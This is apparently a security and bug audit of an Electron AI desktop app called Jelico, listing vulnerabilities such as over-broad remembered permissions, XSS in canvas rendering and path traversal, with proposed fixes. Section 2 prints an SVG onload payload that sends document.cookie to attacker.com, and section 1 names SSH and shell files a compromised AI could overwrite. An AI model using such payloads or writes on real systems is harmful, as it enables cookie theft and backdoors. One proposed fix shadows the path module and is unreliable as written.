# Jelico Technical Deep Dive - Critical Issues

## 1. Permission System Security Analysis

### Current Implementation (Vulnerable)

**File:** `electron/services/permissionChecker.ts`

```typescript
function getRememberedActionPattern(toolName: string, action: string): string {
  if (toolName === 'write_file') {
    return 'Write to:*'  // ❌ TOO BROAD
  }
  if (toolName === 'execute_command') {
    return 'Run:*'  // ❌ TOO BROAD
  }
  // ...
}
```

**Attack Scenario:**
1. User asks AI to "create a readme file"
2. AI calls `write_file` with path `docs/readme.md`
3. User grants permission with "Remember this choice"
4. Pattern stored: `Write to:*`
5. Attacker (or compromised AI) can now write to:
   - `~/.bashrc` (shell injection)
   - `/etc/hosts` (system file)
   - `~/.ssh/authorized_keys` (SSH backdoor)

### Recommended Fix

```typescript
function getRememberedActionPattern(toolName: string, action: string, scope: 'exact' | 'directory' | 'workspace' = 'exact'): string {
  if (toolName === 'write_file') {
    const path = action.replace('Write to:', '').trim()
    
    switch (scope) {
      case 'exact':
        return action  // Exact file path
      case 'directory':
        const dir = path.dirname(path)
        return `Write to:${dir}/*`
      case 'workspace':
        return 'Write to:WORKSPACE/*'
      default:
        return action
    }
  }
  // ...
}
```

### Permission Scopes (Issue #57 Requirements)

```typescript
export type PermissionScope = 
  | 'once'           // Allow once (exact action)
  | 'conversation'   // Allow in this conversation (exact action)
  | 'workspace'      // Allow in project/sandbox instance (exact action)
  | 'deny'          // Deny

// Command differentiation
'mkdir docs' !== 'mkdir src'  // Different commands
```

---

## 2. XSS Vulnerability in Canvas

### Vulnerable Code

**File:** `src/components/Canvas/MermaidViewer.tsx`

```tsx
// Line 175
<div dangerouslySetInnerHTML={{ __html: svgContent }} />

// Line 240
<div dangerouslySetInnerHTML={{ __html: svgContent }} />
```

**File:** `src/components/Canvas/CanvasPanel.tsx`

```tsx
// Line 435
<div dangerouslySetInnerHTML={{ __html: artifact.content }} />
```

### Attack Vector

Malicious AI response or compromised model could inject:

```svg
<svg onload="fetch('https://attacker.com/steal?cookie='+document.cookie)">
  <!-- normal content -->
</svg>
```

### Fix

```tsx
import DOMPurify from 'dompurify'

// Sanitize before rendering
const sanitizedContent = DOMPurify.sanitize(artifact.content, {
  USE_PROFILES: { svg: true, svgFilters: true },
  ALLOWED_ATTR: ['viewBox', 'xmlns', 'width', 'height', 'fill', 'stroke', /* etc */]
})

<div dangerouslySetInnerHTML={{ __html: sanitizedContent }} />
```

---

## 3. Todo State Synchronization Bug

### Root Cause

**File:** `src/stores/todos.ts`

```typescript
// Renderer-only persistence
const TODOS_STORAGE_KEY = 'jelico.todosByConversation.v1'

function writePersistedTodosByConversation(todosByConversation: Record<string, TodoItem[]>) {
  window.localStorage.setItem(TODOS_STORAGE_KEY, JSON.stringify(todosByConversation))
}
```

**Problem:**
- Main process AI calls `todo_write` tool
- Tool updates state via IPC
- But persistence is localStorage (renderer only)
- If renderer restarts or multiple windows, state diverges

### Fix: Move to Database

```typescript
// electron/services/database.ts - Add todo table
interface TodoRecord {
  id: string
  conversation_id: string
  text: string
  status: 'pending' | 'in_progress' | 'done' | 'failed' | 'cancelled'
  created_at: number
  updated_at: number
}

// Main process owns the data
ipcMain.handle('todos:write', async (_, conversationId: string, todos: TodoTask[]) => {
  todoDb.replaceAllForConversation(conversationId, todos)
  // Broadcast to all renderer windows
  BrowserWindow.getAllWindows().forEach(win => {
    win.webContents.send('todos:updated', conversationId, todos)
  })
})
```

---

## 4. Context Window Detection Issues

### Current Problem

**File:** `src/stores/context.ts`

```typescript
const FALLBACK_CONTEXT_SIZE = 100000  // ❌ Too low

// No caching
initConversationContext: async (conversationId, providerId, modelId) => {
  let modelContextSize = FALLBACK_CONTEXT_SIZE
  try {
    const size = await window.jelico.providers.getModelContextSize(providerId, modelId)
    // ...
  }
}
```

### Solution: Multi-tier Lookup

```typescript
interface ContextSizeCache {
  modelId: string
  providerId: string
  contextSize: number
  fetchedAt: number
  source: 'models.dev' | 'api' | 'fallback'
}

const CACHE_TTL = 7 * 24 * 60 * 60 * 1000  // 7 days

async function getModelContextSize(
  providerId: string, 
  modelId: string
): Promise<number> {
  // 1. Check memory cache
  const cached = memoryCache.get(`${providerId}:${modelId}`)
  if (cached && Date.now() - cached.fetchedAt < CACHE_TTL) {
    return cached.contextSize
  }
  
  // 2. Check models.dev snapshot
  const snapshot = await fetch('https://models.dev/api/v1/models')
    .then(r => r.json())
    .catch(() => null)
  
  if (snapshot?.models?.[modelId]?.contextWindow) {
    const size = snapshot.models[modelId].contextWindow
    memoryCache.set(`${providerId}:${modelId}`, { contextSize: size, source: 'models.dev', fetchedAt: Date.now() })
    return size
  }
  
  // 3. Provider API lookup
  const apiSize = await providerApi.getModelInfo(modelId)
  if (apiSize?.contextWindow) {
    memoryCache.set(`${providerId}:${modelId}`, { contextSize: apiSize.contextWindow, source: 'api', fetchedAt: Date.now() })
    return apiSize.contextWindow
  }
  
  // 4. Safe fallback (256K for modern models)
  return 256000
}
```

---

## 5. Sub-Agent Memory Leak

### Problem

**File:** `electron/services/subagents.ts`

```typescript
// These maps grow forever
const conversationAgentLimits = new Map<string, number>()
const conversationAgentCounts = new Map<string, number>()
const usedNamesPerConversation = new Map<string, Set<string>>()
```

### Fix: Cleanup on Conversation Delete

```typescript
// In conversation deletion handler
function cleanupConversationData(conversationId: string) {
  conversationAgentLimits.delete(conversationId)
  conversationAgentCounts.delete(conversationId)
  usedNamesPerConversation.delete(conversationId)
  
  // Also cleanup agents
  const agents = getSubAgentsForConversation(conversationId)
  agents.forEach(agent => dismissSubAgent(agent.id))
}
```

---

## 6. Race Condition in Provider Selection

### Problem

**File:** `src/stores/providers.ts`

```typescript
setActiveProvider: (id) => {
  const provider = get().providers.find(p => p.id === id)
  if (provider) {
    // State updated immediately
    set({ activeProviderId: id, activeModel: provider.defaultModel })
    
    // But persistence is async and can fail
    window.jelico.providers.update(id, { defaultModel: provider.defaultModel })
      .catch((err) => console.warn('...', err))
  }
},
```

### Fix

```typescript
setActiveProvider: async (id) => {
  const provider = get().providers.find(p => p.id === id)
  if (!provider) return
  
  try {
    // Persist first
    await window.jelico.providers.update(id, { defaultModel: provider.defaultModel })
    
    // Then update state
    set({ activeProviderId: id, activeModel: provider.defaultModel })
  } catch (err) {
    // Show error, don't change state
    set({ error: 'Failed to switch provider' })
  }
},
```

---

## 7. Streaming Performance Issues

### Problem

**File:** `src/stores/chat.ts`

```typescript
// Called on EVERY chunk
updateConversationStreamState((current) => ({
  ...current,
  streamingContent: fullContent,
  streamingSegments: segments,
}))
```

### Fix: Throttle Updates

```typescript
import { throttle } from 'lodash-es'

const throttledUpdate = throttle(
  (updater) => updateConversationStreamState(updater),
  50,  // Update every 50ms max
  { leading: true, trailing: true }
)

// Use throttled version during streaming
window.jelico.ai.onStreamChunk(channelId, (chunk) => {
  throttledUpdate((current) => ({
    ...current,
    streamingContent: current.streamingContent + chunk
  }))
})
```

---

## 8. Path Traversal in Sandbox

### Current Implementation

**File:** `electron/ipc/ai.ts`

```typescript
// Sanitize path to prevent sandbox escape
let sanitizedPath = path.replace(/^[a-zA-Z]:/, '')
sanitizedPath = sanitizedPath.replace(/^[/\\]+/, '')
sanitizedPath = sanitizedPath.replace(/\\/g, '/')
```

### Better Implementation

```typescript
import path from 'path'

function resolveSandboxPath(inputPath: string, sandboxDir: string): string {
  // 1. Normalize input
  const normalized = path.normalize(inputPath)
  
  // 2. Resolve within sandbox
  const resolved = path.resolve(sandboxDir, normalized)
  
  // 3. Ensure it's within sandbox
  const relative = path.relative(sandboxDir, resolved)
  
  if (relative.startsWith('..') || path.isAbsolute(relative)) {
    throw new Error('Path traversal attempt blocked')
  }
  
  return resolved
}
```

---

## Summary of Critical Fixes Needed

| Priority | Issue | File(s) | Effort |
|----------|-------|---------|--------|
| P0 | Permission wildcards | `permissionChecker.ts` | Medium |
| P0 | XSS in Canvas | `MermaidViewer.tsx`, `CanvasPanel.tsx` | Low |
| P1 | Todo state sync | `todos.ts`, `database.ts` | Medium |
| P1 | Context window detection | `context.ts` | Low |
| P1 | Provider race condition | `providers.ts` | Low |
| P2 | Sub-agent memory leaks | `subagents.ts` | Medium |
| P2 | Streaming performance | `chat.ts` | Low |
| P2 | Path traversal | `ai.ts` | Low |

---

*For Copilot CLI implementation guidance*
